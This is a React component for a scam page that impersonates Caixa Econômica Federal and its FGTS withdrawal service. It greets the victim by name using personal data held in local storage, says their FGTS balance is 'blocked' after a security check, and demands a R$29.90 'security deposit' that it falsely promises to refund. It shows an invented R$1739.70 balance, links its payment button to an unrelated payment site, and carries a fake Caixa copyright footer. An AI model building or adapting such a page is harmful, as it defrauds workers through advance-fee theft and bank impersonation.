import { useEffect, useState } from "react";
import Vimeo from "@u-wave/react-vimeo";
import { IoMdCheckmarkCircle, IoIosWarning } from "react-icons/io";
import logo from "../assets/caixalogo.png";
import fgtsLogo from "../assets/fgts2.png";
import pix from "../assets/pix.png";
import { UserData } from "../types/userData";
import { BiCreditCard, BiLock, BiMoneyWithdraw } from "react-icons/bi";
import logocaixa from "../assets/caixalogo.png"

export function PagamentoUpsell() {
    const [displayedAmount, setDisplayedAmount] = useState(0);
    const saqueTotal = 1739.70; // Valor do saque disponível
    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        cep: "",
        cidade: "",
        estado: "",
        nomeMae: "",
        rua: "",
        numero: "",
    });

    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    useEffect(() => {
        const interval = setInterval(() => {
            setDisplayedAmount((prev) =>
                prev < saqueTotal ? prev + 50 : saqueTotal
            );
        }, 50);
        return () => clearInterval(interval);
    }, [saqueTotal]);



    return (
        <div className="min-h-screen bg-gradient-to-br from-white to-gray-50 flex flex-col items-center text-gray-800">
            {/* Cabeçalho */}
            <header className="w-full p-4 bg-[#025bab] flex items-center justify-between shadow-md">
                <div className="flex items-center space-x-3">
                    <img src={logo} alt="Logo Caixa" className="w-8" />
                    <span className="text-white font-medium">
                        Olá, {userData?.nome.split(" ")[0]}!
                    </span>
                </div>
                <img src={fgtsLogo} alt="Logo FGTS" className="w-14" />
            </header>

            {/* Conteúdo */}
            <main className="w-full max-w-3xl flex flex-col items-center py-8 px-4 space-y-6 text-center">
                {/* Alerta de Fraude */}
                <div className="bg-white p-6 shadow-lg rounded-lg">
                    <div className="w-full flex justify-center text-red-600 mb-2">
                        <IoIosWarning size={60} />
                    </div>
                    <h1 className="text-2xl md:text-3xl font-bold text-red-600 flex items-center justify-center space-x-3">
                        <span>Falha na Verificação de Segurança</span>
                    </h1>
                    <p className="text-gray-700 text-lg mt-4">
                        Para sua segurança, o seu dinheiro do FGTS está temporariamente{" "}
                        <strong className="text-red-600">bloqueado</strong>
                    </p>
                </div>

                {/* Painel Explicativo */}
                <div className="bg-white p-3 rounded-lg w-full">
                    <div className="flex items-center space-x-2 justify-center">
                        <div className="bg-primary rounded-full p-2 w-fit">
                            <img width={30} src={logo} alt="" />
                        </div>
                        <h3 className="text-4xl text-primary font-bold">ATENÇÃO!</h3>
                    </div>


                    <p className="my-6 text-lg">
                        Todos os dias milhares de golpistas tentam invadir e sacar o dinheiro do FGTS dos trabalhadores. Para garantir que sua conta está segura, a Caixa Econômica realiza uma verificação de identidade para ter certeza que é você mesmo que está tentando sacar o dinheiro.
                    </p>

                    {/* <p className="text-gray-600 mt-8 text-lg">
                        <span className="font-bold text-primary">Não se preocupe:</span> O bloqueio temporário foi feito para sua proteção. Basta realizar um pagamento simbólico de{" "}
                        <span className="text-green-600">R$47,00</span> para desbloquear sua conta e garantir que você é o titular.
                    </p> */}
                </div>

                <h2 className="text-3xl font-bold">COMO VERIFICAR IDENTIDADE E LIBERAR O DINHEIRO:</h2>

                <div className="bg-gradient-to-br from-white to-gray-50 p-2 rounded-lg shadow-xl space-y-3 text-gray-800">

                    <p className="text-lg py-4 text-gray-600 text-center">
                        Para verificar sua identidade e liberar o dinheiro do FGTS,
                        A caixa pede um <span className="text-primary font-bold">Caução de Segurança</span> no valor de R$29,90 para provar que é você mesmo que está tentando sacar. <br /> <br />
                        O valor do Caução será totalmente <span className="text-primary font-bold">reembolsado</span> junto com o pagamento dos rendimentos do FGTS.
                    </p>

                    <h3 className="text-2xl font-bold">PASSO A PASSO:</h3>

                    {/* Etapas do Processo */}
                    <div className="space-y-6">

                        <div className="flex items-start space-x-4 bg-red-50 p-6 rounded-lg shadow-md">
                            <div className="flex justify-center items-center w-16 h-16 bg-red-100 rounded-full shadow-lg">
                                <BiLock className="text-red-600 text-3xl" />
                            </div>
                            <div className="flex-1">
                                <h3 className="text-xl font-semibold text-gray-800">1. VERIFICAÇÃO DE SEGURANÇA</h3>
                                <p className="text-gray-600 text-lg">
                                    Essa medida é para proteger o seu dinheiro contra golpistas
                                </p>
                            </div>
                        </div>

                        <div className="flex items-start space-x-4 bg-yellow-50 p-6 rounded-lg shadow-md">
                            <div className="flex justify-center items-center w-16 h-16 bg-yellow-100 rounded-full shadow-lg">
                                <BiCreditCard className="text-yellow-600 text-3xl" />
                            </div>
                            <div className="flex-1">
                                <h3 className="text-xl font-semibold text-gray-800">2. PAGAMENTO DO CAUÇÃO</h3>
                                <p className="text-gray-600 text-lg">
                                    O valor é 100% reembolsado após a confirmação.
                                </p>
                            </div>
                        </div>

                        <div className="flex items-start space-x-4 bg-green-50 p-6 rounded-lg shadow-md">
                            <div className="flex justify-center items-center w-16 h-16 bg-green-100 rounded-full shadow-lg">
                                <BiMoneyWithdraw className="text-green-600 text-3xl" />
                            </div>
                            <div className="flex-1">
                                <h3 className="text-xl font-semibold text-gray-800">3. RECEBIMENTO DO FGTS 2024</h3>
                                <p className="text-gray-600 text-lg">
                                    Você receberá o dinheiro do seu FGTS na chave PIX cadastrada, juntamente com o reembolso do caução de segurança
                                </p>
                            </div>
                        </div>

                    </div>
                </div>


                {/* Explicação em vídeo */}
                <div className="bg-white p-6 shadow-lg rounded-lg">
                    <h2 className="text-2xl font-semibold text-gray-800">
                        Por que o pagamento é necessário?
                    </h2>
                    <Vimeo
                        video="1034674911"
                        autoplay
                        showTitle={false}
                        className="my-4 rounded-lg"
                        width={330}
                        height={400}
                    />
                    <p className="text-gray-600 text-xl mb-4">
                        O <span className="text-primary">Caução de Segurança</span> de R$29,90 é uma medida de segurança para proteger seu dinheiro. <br />

                    </p>
                    <span className="mt-10 text-lg">O valo será <span className="text-primary">100% reembolsado</span> junto com o FGTS.</span>
                </div>

                <h3 className="text-2xl font-bold">{userData?.nome.split(" ")[0]}, esse é o valor que você tem disponível:</h3>
                {/* Informações financeiras */}
                <div className="bg-white p-6 rounded-lg w-full ">
                    <p className="text-lg text-gray-500">Saldo disponível para saque:</p>
                    <p className="text-4xl md:text-5xl font-extrabold text-green-600">
                        R$ {displayedAmount.toFixed(2)}
                    </p>
                </div>

                <div className="shadow-lg p-4">
                    <div className="flex items-center justify-center space-x-1">
                        <div className="bg-primary p-2 w-fit rounded-full">
                            <img src={logocaixa} width={25} alt="" />
                        </div>
                        <p className="text-lg mb-2 text-primary font-medium">CAUÇÃO DE SEGURANÇA:</p>
                    </div>
                    {/* <p className="text-2xl mb-2 text-zinc-400">DE: R$47,89</p> */}
                    <p className="text-4xl font-semibold text-primary mb-4">R$29,90</p>

                    <a href="https://pay.iexperience-app.com/19945266">
                        <button className="bg-green-600 text-white font-bold text-lg animate-pulse iexperience-upsell">PAGAR CAUÇÃO DE SEGURANÇA E SACAR MEU FGTS</button>
                    </a>
                </div>



                {/* Informações sobre Pix */}
                <div className="flex flex-col items-center mt-8 space-y-4 text-sm">
                    <img src={pix} alt="Logo Pix" className="w-24" />
                    <p className="text-gray-600 flex items-center">
                        <IoMdCheckmarkCircle className="text-green-500 mr-2" />
                        Pagamento rápido, seguro e reembolsável.
                    </p>
                    <p className="text-gray-500">
                        O valor será reembolsado imediatamente após a conclusão do desbloqueio do saldo.
                    </p>
                </div>
            </main>

            {/* Rodapé */}
            <footer className="w-full bg-gray-100 py-4 flex items-center justify-center text-sm text-gray-500">
                <p>
                    © {new Date().getFullYear()} Caixa Econômica Federal. Todos os direitos reservados.
                </p>
            </footer>
        </div>
    );
}
